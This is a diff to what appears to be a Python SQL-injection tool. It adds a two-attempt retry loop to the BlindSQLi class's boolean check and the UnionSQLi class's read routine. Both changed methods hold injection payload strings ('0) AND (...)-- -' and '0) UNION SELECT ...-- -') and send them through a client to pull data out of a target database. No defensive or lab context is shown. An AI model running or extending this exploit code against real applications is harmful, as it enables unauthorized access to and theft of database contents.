@@ -244,8 +244,13 @@ class BlindSQLi:
         return r1 and not r2
 
     def _true(self, cond):
-        self.requests += 1
-        return bool(self.client.rows(self.client.inject("0) AND ({})-- -".format(cond))))
+        rows = None
+        for _ in range(2):
+            self.requests += 1
+            rows = self.client.rows(self.client.inject("0) AND ({})-- -".format(cond)))
+            if rows is not None:
+                break
+        return bool(rows)
 
     def extract(self, expr, max_length=128):
         out = []
@@ -298,9 +303,14 @@ class UnionSQLi:
         return int(t)
 
     def _read(self, expr):
-        self.requests += 1
-        resp = self.client.union_inject("0) UNION SELECT {}-- -".format(self._cols(expr)))
-        m = self._re.search(resp.text)
+        m = None
+        resp = None
+        for _ in range(2):
+            self.requests += 1
+            resp = self.client.union_inject("0) UNION SELECT {}-- -".format(self._cols(expr)))
+            m = self._re.search(resp.text)
+            if m:
+                break
         if not m:
             return None
         digits = m.group(1)
